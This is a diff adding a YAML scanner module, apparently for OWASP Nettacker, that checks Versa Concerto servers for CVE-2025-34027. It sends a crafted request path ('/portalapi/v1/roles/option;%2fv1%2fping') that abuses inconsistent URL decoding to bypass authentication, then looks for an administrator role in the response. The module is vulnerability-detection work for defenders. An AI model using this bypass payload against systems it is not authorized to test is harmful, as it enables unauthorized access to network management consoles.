@@ -1,0 +1,52 @@
+info:
+  name: versa_concerto_cve_2025_34027_vuln
+  author: Sankalp Bansal
+  severity: 10.0
+  description: >
+    CVE_2025_34027 allows authentication bypass in the Versa Concerto
+    due to the inconsistent URL decoding. URLs are processed without
+    decoding to the controllers that allowed unauthorized access to
+    certain endpoints. The Spack upload endpoint can be leveraged for
+    a Time-of-Check to Time-of-Use (TOCTOU) write in combination with
+    a race condition to achieve Remote Code Execution(RCE).
+  reference:
+    - https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-34027
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2025
+    - versa_concerto
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/portalapi/v1/roles/option;%2fv1%2fping"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - "80"
+                - "443"
+        response:
+          condition_type: and
+          conditions:
+            header:
+              regex: "EECP-CSRF-TOKEN"
+              reverse: false
+            content:
+              regex: "ENTERPRISE_ADMINISTRATOR"
+              reverse: false
